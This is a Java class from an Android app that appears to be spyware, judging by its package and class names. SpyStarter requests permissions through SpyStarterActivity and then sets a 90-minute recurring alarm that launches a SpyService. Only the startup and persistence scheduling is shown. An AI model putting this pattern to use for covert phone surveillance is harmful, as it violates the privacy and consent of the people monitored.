package com.gameofcoding.spy.spys;

import android.content.Context;
import android.content.Intent;
import com.gameofcoding.spy.activities.SpyStarterActivity;
import com.gameofcoding.spy.receivers.SpyAlarmReceiver;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.Utils;

/**
 * Starts spy. Sets an alarm that starts SpyService
*/
public class SpyStarter {
    private static final String TAG = "SpyStarter";
    private static final int SPY_ALARM_ID = 10001;
    private Context mContext;

    public SpyStarter(Context context) {
	mContext = context;
    }

    public void start() {
	if(mContext == null) {
	    XLog.e(TAG, "start(): Could not start alarm as passed 'Context' is null.");
	    return;
	}
	
	Utils utils = new Utils(mContext);
	if(!utils.hasPermissions()) {
	    XLog.d(TAG, "start(): Starting 'SpyStarterActivity' to grant all permissions."); 
	    mContext.startActivity(new Intent(mContext, SpyStarterActivity.class));
	} else {
	    utils.setAlarm(SpyAlarmReceiver.class, Utils.minToMillis(90), SPY_ALARM_ID);
	}
    }
}
